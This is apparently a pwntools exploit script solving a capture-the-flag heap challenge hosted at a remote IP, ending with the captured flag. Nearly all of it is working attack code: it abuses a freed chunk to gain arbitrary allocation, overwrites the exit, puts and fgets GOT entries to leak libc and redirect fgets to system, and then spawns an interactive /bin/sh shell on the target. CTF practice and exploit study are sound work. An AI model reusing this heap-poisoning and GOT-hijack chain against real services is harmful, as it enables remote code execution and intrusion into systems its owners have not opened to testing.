#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 34.70.212.151 --port 8001 chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.70.212.151'
port = int(args.PORT or 8001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fe000)
def prompt(m):
    io.sendlineafter(b">> ",m)

def prompti(i):
    prompt(str(i).encode())

def cmd(i):
    prompti(i)

def add(idx,sz):
    cmd(1)
    prompti(idx)
    prompti(sz)

def chg_size(idx,sz):
    cmd(2)
    prompti(idx)
    prompti(sz)

def delete(idx):
    cmd(3)
    prompti(idx)

def edit(idx,data):
    cmd(4)
    prompti(idx)
    prompt(data)

def exit():
    cmd(5)

def arb_alloc(addr,sz,idx=0):
    add(idx,sz)
    add(idx+1,sz)
    delete(idx+1)
    delete(idx)
    edit(idx,p64(addr))
    add(idx+1,sz)
    add(idx,sz)

def arbw(addr,v,idx=0):
    arb_alloc(addr,len(v)+3,idx=idx)
    edit(idx,v)

def arbr(addr):
    # overwrite code by addr and exit got entry by puts
    # note the address has to be at most 4 non-null bytes
    arbw(exe.got.exit,p64(exe.plt.puts))
    arbw(exe.sym.code,p64(addr))
    exit()
    io.recvline()
    lk = io.recvline()[:-1]
    return lk

io = start()

# libc leak
libc = exe.libc
lk = arbr(exe.got.puts)
libc.address = unpack(lk,"all") - libc.sym.puts
log.info(hex(libc.address))

# fgets got overwrite + edit /bin/sh chunk
add(7,0x200)
edit(7,b"/bin/sh\0")
arbw(exe.got.fgets,p64(libc.sym.system))
edit(7,b"")

io.interactive()

# flag{St34l_l1bc_w17h_mun3y}
